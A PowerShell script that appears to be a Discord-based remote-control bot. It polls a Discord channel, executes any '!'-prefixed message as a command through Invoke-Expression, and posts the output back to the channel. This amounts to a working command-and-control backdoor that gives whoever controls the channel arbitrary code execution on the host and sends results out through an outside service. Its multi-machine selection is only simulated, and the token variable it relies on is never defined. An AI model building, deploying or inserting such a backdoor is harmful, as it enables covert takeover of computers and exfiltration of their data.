# Define hardcoded token, channelId, botUserId, and baseUrl
$channelId = "1282419492533698651"
$botUserId = "1282419666022563975"  # Hardcoded bot user ID
$baseUrl = "https://discord.com/api/v10"

# Create a reusable HttpClient
Add-Type -AssemblyName System.Net.Http
$client = New-Object System.Net.Http.HttpClient

# Set the Authorization header for all requests
$client.DefaultRequestHeaders.Authorization = "Bot $token"
$client.DefaultRequestHeaders.Accept.Add("application/json")

# Variable to store the selected machine
$global:selectedMachine = $null
$global:sessionLocked = $false

# Function to send a message to Discord
function Send-DiscordMessage {
    param (
        [string]$Message
    )

    # Create request body as JSON
    $body = @{
        "content" = $Message
    } | ConvertTo-Json

    # Create StringContent for HTTP Post request
    $content = New-Object System.Net.Http.StringContent($body, [System.Text.Encoding]::UTF8, "application/json")

    # Send the POST request to Discord
    try {
        $response = $client.PostAsync("$baseUrl/channels/$channelId/messages", $content).Result
        if ($response.IsSuccessStatusCode) {
            Write-Host "Message sent successfully."
        } else {
            Write-Host "Error sending message. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
        }
    } catch {
        Write-Host "Error sending message: $_"
    }
}

# Function to list available machines using `whoami`
function List-Machines {
    if ($global:sessionLocked) {
        Send-DiscordMessage -Message "A machine is currently selected. Use !exit_machine to deselect it before listing other machines."
        return
    }

    # Example of multiple connected machines with their whoami information
    $machines = @("machine1\user", "machine2\user", "machine3\user")
    
    # Send the list to Discord
    $machineList = "Available machines:`n"
    $machines | ForEach-Object {
        $machineList += "$_`n"
    }
    
    Send-DiscordMessage -Message $machineList
}

# Function to execute a command on the selected machine
function Execute-OnMachine {
    param (
        [string]$machineName,
        [string]$command
    )

    # Check if the machine is still selected
    if ($global:selectedMachine -eq $machineName) {
        try {
            # Run the command (this is a simulation - adjust as needed to actually run commands on a remote machine)
            $output = Invoke-Expression $command  # For now, it runs locally; adjust for remote execution

            if ($output) {
                $result = $output -join "`n"  # Join multiline output for Discord message
            } else {
                $result = "Command executed successfully with no output."
            }
        } catch {
            $result = "Error executing command: $_"
        }

        # Send the output to Discord
        Send-DiscordMessage -Message $result
    } else {
        Send-DiscordMessage -Message "Invalid machine selection or no machine selected."
    }
}

# Function to execute bot commands
function Execute-BotCommand {
    param (
        [string]$command
    )

    if ($command -eq "exit_machine") {
        # Exit the current machine selection
        $global:selectedMachine = $null
        $global:sessionLocked = $false
        Send-DiscordMessage -Message "Exited the machine. You can now select a new machine."
    } elseif ($command -eq "list_machines") {
        List-Machines
    } elseif ($command.StartsWith("select:")) {
        $machineName = $command.Replace("select:", "").Trim()
        
        # Simulate machine selection (adjust logic for actual machine availability)
        if ($machineName -in @("machine1\user", "machine2\user", "machine3\user")) {
            $global:selectedMachine = $machineName
            $global:sessionLocked = $true
            Send-DiscordMessage -Message "Selected machine: $machineName. Future commands will be sent to this machine."
        } else {
            Send-DiscordMessage -Message "Invalid machine name: $machineName"
        }
    } else {
        # Send the command to the selected machine
        if ($global:selectedMachine) {
            Execute-OnMachine -machineName $global:selectedMachine -command $command
        } else {
            Send-DiscordMessage -Message "No machine selected. Use !list_machines to see available machines."
        }
    }
}

# Function to get messages from Discord
function Get-DiscordMessages {
    try {
        # Add limit to fetch the most recent messages
        $response = $client.GetAsync("$baseUrl/channels/$channelId/messages?limit=10").Result
        if ($response.IsSuccessStatusCode) {
            $content = $response.Content.ReadAsStringAsync().Result
            return $content | ConvertFrom-Json
        } else {
            Write-Host "Error fetching messages. Status code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response: $responseContent"
            return $null
        }
    } catch {
        Write-Host "Error fetching messages: $_"
        return $null
    }
}

# Initialize the bot by setting the last processed message ID
function Initialize-LastMessageId {
    $messages = Get-DiscordMessages
    if ($messages) {
        # Set $lastMessageId to the ID of the most recent message so old messages are ignored
        $global:lastMessageId = $messages[0].id
        Write-Host "Bot initialized. Ignoring messages before ID: $lastMessageId"
    }
}

# Initialize the bot
Initialize-LastMessageId

# Main loop with rate limiting and command filtering
while ($true) {
    $messages = Get-DiscordMessages

    if ($messages) {
        foreach ($message in $messages) {
            # Process only if it's a new message and it's not sent by the bot itself
            if ($message.id -gt $lastMessageId -and $message.author.id -ne $botUserId) {
                if ($message.content.StartsWith("!")) {
                    $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase
                    Execute-BotCommand -command $command
                }
                $lastMessageId = $message.id  # Update the last processed message ID
            }
        }
    }

    Start-Sleep -Seconds 5
}
